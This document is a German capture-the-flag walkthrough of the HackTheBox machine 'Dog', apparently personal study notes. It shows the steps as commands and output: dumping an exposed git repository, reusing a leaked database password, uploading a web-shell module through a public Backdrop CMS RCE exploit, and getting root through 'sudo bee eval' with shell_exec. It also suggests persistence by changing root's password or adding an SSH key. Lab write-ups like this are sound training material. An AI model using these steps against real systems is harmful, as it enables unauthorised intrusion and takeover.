status: #pwnd 
level: #easy 
tags: #linux #web #git #backdrop #RCE #PHP #privilege_escalation
tools: Pwnbox oder Kali Linux, nmap, ssh, linpeas, python, git-dumper

---
# Ziel 
- auf Server kommen 
- user.txt finden und auslesen (immer im Home Verzeichnis von einem User auf dem System z.b /home/johncusack/user.txt) 
- root.txt finden und auslesen (immer im Home Verzeichnis von Root also /root/root.txt)

# Vorbereitung

HackTheBox VPN verbinden und DANACH mtu vom tun0 Interface anpassen 

```bash
sudo ip link set dev tun0 mtu 1200
```

Jetzt ZUERST einen eigenen Ordner für diese Maschine erstellen, z.B htb_machine_dog. Ordnung muss sein. Dann gehen wir mit dem Befehl `cd` in den erstellen Ordner.

# Ablauf
## User Flag

Als erstes scannen wir die Maschine um offene Ports sowie die dahinter steckenden Service herauszufinden

```bash
nmap -sS -p- IPADRESSE 

nmap -sS -sV -sC -p22,80 IPADRESSE
```

Folgende Informationen finden wir heraus:
- Port 22 (SSH)
- Port 80 (HTTP)
	- wir finden ebenfalls hier ein Git Repository
	- sowie eine `robots.txt`Datei

Wir fügen nun die IP Adresse in die `/etc/hosts` Datei damit wir im Browser anstatt über die IP Adresse über einen Domainnamen darauf zugreifen können. Wir wählen den Domainnamen `dog.htb`

```bash
echo "IPADRESSE dog.htb" | sudo tee -a /etc/hosts
```

Nun steuern wir im Browser auf `http://dog.htb`

Wir schauen uns ein wenig auf der Website um und finden folgenden Informationen heraus:
- System läuft über Backdrop CMS
- Unter About finden wir eine Email: `support@doghtb`
- Ebenfalls gibt es einen Loginbereich

Durch unseren nmap Scan von vorhin wissen wir bereits dass es ein Git Repository auf der Seite gibt. Dieses wollen wir uns nun herunterladen.
Dafür nutzen wir folgendes Tool:
- [git-dumper](https://github.com/arthaud/git-dumper)

```bash
# Dieses Tools kann man über Pip installieren 
# Dafür erstellen wir uns zunächst ein Python Environment
sudo apt install python3-venv 
python3 -m venv UnserVenv 
source ./UnserVenv/bin/activate 

# Nun haben wir ein Python Environment erstellt und können hier die Bibliotheken installieren die wir brauchen 
pip install git-dumper 

# Jetzt können wir dieses Tools ausführen 
git-dumper http://dog.htb
```

Das Git Repository wurde heruntergeladen und wir können dieses nun durchstöbern nach allen möglichen Informationen (Email Adressen, Passwörter, Usernamen, Versionsnummern, etc.)

Schauen wir uns zunächst die Datei `settings.php`an
Wir finden folgende interessante Informationen
- `$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';` 
	Wir haben hier einen mysql Datenbank Zugang gefunden 
	- Typ: mysql 
	- User: root 
	- Passwort: BackdropJ2024DS2024 
	- Öffentlich Zugreifbar?: Nein, diese Datenbank ist nur auf dem System Zugreifbar also für uns gerade nicht zu gebrauchen.

Schauen wir uns nun die weiteren Dateien an, um diesen Prozess ein wenig zu vereinfachen wollen wir nun alle Dateien auf einmal iterieren und auslesen und nach bestimmten Keywords suchen.
Mögliche Keywords sind z.B `username`, `password`, `version`, `backdrop`, `@dog.htb`und noch einige mehr

```bash
grep -ri "password" 
# Keine interessanten Infos 

grep -ri "username" 
# Keine interessanten Infos 

grep -ri "version" 
# Wir finden raus dass hier wohl Backdrop CMS version 1.27.1 läuft 

grep -ri "@dog.htb" 
# Wir finden 2 Emails: dog@dog.htb und tiffany@dog.htb
```

Anhand dieser Infos schauen wir nun nach was wir online herausfinden.
Suchen wir erst einmal nach der Backdrop CMS Version 1.27.1 ob es dort bereits bekannte Schwachstellen gibt.
Wir finden folgende Links:
- https://sploitus.com/exploit?id=EDB-ID:52021&utm_source=rss&utm_medium=rss 
- https://www.exploit-db.com/exploits/52021

Beide handeln von der selben Authenticated Remote Command Execution (RCE). 
Da es sich jedoch um eine Authenticated RCE handlet müssen wir es erstmal schaffen uns auf der Website einzuloggen.

Wir haben vorhin die anhand der Emails und der Datenbank die Usernamen `root`, `dog` und `tiffany`gefunden sowie ein Passwort für die Datenbank.
Testen wir dieses Passwort in Kombination mit den Usernamen einfach mal aus beim Loginbereich der Website

Und wir sind drinnen mit dem Usernamen `tiffany`und dem Passwort `BackDropJ2024DS2024`
Kein Bruteforce mit Hydra oder Burpsuite notwenig, es wurde einfach das Passwort der Datenbank wiederverwendet.

Kommen wir nun zurück zu der eben gefundenen Authenticated RCE für Backdrop, vorallem zu dem vorhandenen Exploit dafür (https://www.exploit-db.com/exploits/52021).
Über den Download Button laden wir uns den Exploit erstmal runter in unseren angelegten Ordner.

![](../assets/htb_machine_dog1.png)

Wir überprüfen den Exploit natürlich erst einmal was er genau macht und wie dieser ausgeführt wird.
Nun führen wir den Exploit einmal aus, es handelt sich um eine Python Datei.

```bash
python3 52021.py http://dog.htb
```

Es wird daraufhin ein `shell`Ordner mit zwei Dateien erstellt
- `shell.info`
- `shell.php`
Und eine Datei neben dem Ordner
- `shell.zip`

Ebenso werden zwei Links ausgegeben über die wir die ZIP Datei hochladen können um danach die RCE ausnutzen zu können
- http://dog.htb/?q=admin/modules/install (der Original Link funktioniert nicht) 
- http://dog.htb/modules/shell/shell.php

Über den ersten Link laden wir die ZIP Datei hoch anhand des Buttons `manual installation`
(http://dog.htb/?q=admin/installer/manual)

![](../assets/htb_machine_dog2.png)

Problem: Es werden nur `tar`, `tgz`, `gz`, und `bz2`Dateien akzeptiert. Also zurück zu unserem Terminal

```bash
tar cvf shell.tar /shell
```

Nun haben wir ein `tar`Archiv erstellt welches die beiden Dateien enthält `shell.info`und `shell.php`

Jetzt laden wir diese Datei hoch über den Button `Browse...`und klicken danach auf `INSTALL`

Nach dem Upload navigieren wir zu http://dog.htb/modules/shell/shell.php

![](../assets/htb_machine_dog3.png)

Dort finden wir ein Eingabefeld vor in das wir nun beliebige Shell Befehle ausführen können

Wichtig: das hochgeladene Modul wird jede Minute wieder gelöscht, danach müssen wir die `shell.tar` Datei wieder hochladen und zu unserer Shell navigieren im Browser.

Führen wir nun mal ein paar Testbefehle aus und schauen was wir als Antwort zurückbekommen

```bash
id 
# uid=33(www-data) gid=33(www-data) groups=33(www-data 

pwd 
# /var/www/html/modules/shell 

ls -la /home 
# drwxr-xr-x 4 jobert jobert 4096 Feb 7 15:59 jobert 
# drwxr-xr-x 3 johncusack johncusack 4096 Feb 7 15:59 johncusack 

cat /etc/passwd 
# zu langer Output, schaut es euch selbst an 

ls -la /home/johncusack 
# lrwxrwxrwx 1 root root 9 Feb 7 15:59 .bash_history -> /dev/null 
# -rw-r--r-- 1 johncusack johncusack 220 Aug 15 2024 .bash_logout 
# -rw-r--r-- 1 johncusack johncusack 3771 Aug 15 2024 .bashrc 
# drwx------ 2 johncusack johncusack 4096 Aug 16 2024 .cache 
# lrwxrwxrwx 1 root root 9 Feb 7 15:59 .mysql_history -> /dev/null 
# -rw-r--r-- 1 johncusack johncusack 807 Aug 15 2024 .profile 
# -rw-r----- 1 root johncusack 33 Mar 15 11:44 user.txt
```

Das reicht uns erstmal. Wir würden uns eigentlich natürlich noch viel mehr anschauen wir z.B den anderen gefundenen User `robert`oder `cronjobs`, `Prozesse`, ob und welche `sudo` Berechtigungen wir haben, Dateien die mit dem `SUID`oder `SGID`fälschlicherweise bestückt sind, oder ob es generelle Miskonfigurationen gibt die wir ausnutzen können und und und.

Was wir also bisher gefunden haben sind:
- Zwei User `jobert`und `johncusack`
- `johncusack`enthält die `user.txt`Datei in seinem Home Verzeichnis
- Wir wissen das Port 22 aktiv ist
- Ebenso dass das Passwort `BackdropJ2024DS2024` reused wurde und ggf. für weitere Accounts genutzt wurden ist.

Testen wir diese Theorie doch einfach mal ob das Passwort noch weiter verwendet wurde

```bash
ssh jobert@dog.htb 
# kein Erfolg 

ssh johncusack@dog.htb 
# und wir kommen mit dem Passwort rein
```

Das Passwort wurde also erneut wiederverwendet und wir haben nun eine vernüntige Shell und können uns auf dem System in Ruhe rumbewegen und ebenso unsere erste Flagge auslesen

```bash
cat user.txt
```

## Root Flag

Jetzt geht es darum unsere Privilegien zu eskalieren um irgendwie an die `root.txt`im `/root` Verzeichnis dranzukommen.
Das heißt wir suchen nun nach Angriffsvektoren auf dem System durch die wir erhöhte Berechtigungen bekommen (am liebsten direkt Root Rechte)

Führen wir zuerst ein paar Basic Befehle aus

```bash
sudo -l 
# User johncusack may run the following commands on dog: 
# (ALL : ALL) /usr/local/bin/bee 

ps auxww 
# zu großer Output, selber machen 

ss -tulpn 
# UNCONN 127.0.0.53%lo:53   0.0.0.0:* 
# LISTEN 127.0.0.1:33060    0.0.0.0:* 
# LISTEN 127.0.0.1:3306     0.0.0.0:* 
# LISTEN 127.0.0.53%lo:53   0.0.0.0:* 
# LISTEN 0.0.0.0:22         0.0.0.0:* 
# LISTEN *:80               *:* 
# LISTEN [::]:22            [::]:*
```

Ebenfalls könnten wir das Privilege Escalation (PE) Script `linpeas.sh` ausführen, dafür müssten wir uns dies auf unsere eigene Maschine herunterladen und dann mittels z.B SCP auf die Target Maschine übertragen und dort ausführen. Dieses Skript überprüft alle bekannten PE Angriffsvektoren und gibt uns wichtige und interessante Informationen, nur in diesem Fall nichts allzu interessantes.

Schreiten wir nun fort mit den Infos die wir herausgefunden haben:
- User `johncusack` besitzt die Möglichkeit das Tool `bee`mit sudo auszuführen

Schauen wir uns das Tool erst einmal an

```bash
bee
# Zu goßer Output, selber machen
```

Das Tool besitzt einige Funktionalitäten, die wir jedoch zum Großteil nicht gebrauchen können. 
Wir suchen gerade speziell nach einen Subbefehl/Parameter der am liebsten etwas `Executed`um dadurch arbiträren Code auszuführen mit den Root Rechten die wir besitzen.

Wir finden folgende Subbefehle/Parameter:
- `eval` 
	- Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
- `--root`
	- Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

Den Parameter `--root` benötigen wir nun um den Installationsort von Backdrop CMS zu definieren, dieser liegt natürlich dort wo der Server läuft und zwar unter `/var/www/html`.
Den Subbefehl `eval` wollen wir nutzen in der Hoffnung dass wir damit arbiträren Code ausführen können.
Da `eval` PHP Code ausführt können wir uns ein kurzes PHP Script erstellen welches Shell Befehle auf dem System ausführt

```php
echo shell_exec("id");
```

die Funktion `shell_exec` führt einfach einen Shell Befehl aus, hier gerade `id`, und `echo` gibt den Output davon einfach ins Terminal aus.

Führen wir nun diesen Code mit dem `bee`Befehl aus bekommen wir folgendes

```bash
sudo bee --root=/var/www/html eval 'echo shell_exec("id");'
# uid=0(root) gid=0(root) groups=0(root)
```

Wir sehen dass wir Root Rechte damit haben.

Nun können wir den PHP Code so anpassen, dass wir die `root.txt` Datei auslesen

```bash
sudo bee --root=/var/www/html eval 'echo shell_exec("cat /root/root.txt");'
```

und damit haben wir unsere Root Flag und haben die Maschine durch.

Spaßhafterweise können wir natürlich diese Schwachstelle ausnutzen um uns als Root anzumelden, indem wir z.B das Passwort für den Root User abändern oder einen SSH Schlüssel generieren und für Root um uns per SSH direkt mit Ihn einzuloggen und und und.

Schritte die wir hätten auch noch machen können von Anfang an.
- Subdomänen/Directories der Webseite enummerieren mit `ffuf`, `gobuster` 
- Passwort Bruteforce Angriff mit `hydra` auf den Login Zugang 
- Polkit Exploit ([CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)) austesten ob diese Funktioniert, da `linpeas` uns diese Vorschlägt als möglicher PE Vektor. (Funktioniert nicht da Vorraussetzungen nicht erfüllt sind)
